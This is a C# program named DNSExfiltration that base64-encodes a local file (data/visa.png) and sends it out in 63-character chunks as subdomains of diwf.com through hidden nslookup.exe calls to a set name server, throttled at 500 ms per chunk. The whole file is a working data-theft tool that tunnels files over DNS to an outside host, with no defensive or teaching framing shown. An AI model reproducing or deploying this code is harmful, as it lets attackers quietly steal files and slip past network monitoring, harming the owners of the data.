using System;
using System.IO;
using System.Threading;

namespace DNSExfiltration
{
    class Program
    {
        static String Domain = "diwf.com";
        static String NSserver = "192.168.111.141";
        static void Main(string[] args)
        {

            ConvertInto64("data/visa.png", "data/encode.dat");
            SendFile("data/encode.dat");
        }

        public static void DoTrans(String cmd)
        {
            //Nslookups reqs
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "nslookup.exe";
            startInfo.Arguments = cmd + "." + Domain + " " + NSserver;
            process.StartInfo = startInfo;
            process.Start();
        }
        public static void ConvertInto64(String file, String path)
        {
            //Convert file into Base64
            byte[] b = File.ReadAllBytes(file);
            string store = Convert.ToBase64String(b);
            File.WriteAllText(path, store);
        }


        public static void SendFile(string inputFile)
        {
            const int BUFFER_SIZE = 20 * 1024;
            byte[] buffer = new byte[BUFFER_SIZE];

            using (Stream input = File.OpenRead(inputFile))
            {
                int index = 0;
                while (input.Position < input.Length)
                {
                    int remaining = 63, bytesRead;
                    while (remaining > 0 && (bytesRead = input.Read(buffer, 0,
                            Math.Min(remaining, BUFFER_SIZE))) > 0)
                    {

                        DoTrans(System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead));
                        Console.WriteLine(System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead));
                        remaining -= bytesRead;
                    }

                    index++;
                    Thread.Sleep(500);
                }
            }

            //Console.Read();
            Console.WriteLine("\nDONE!");
        }
    }
}
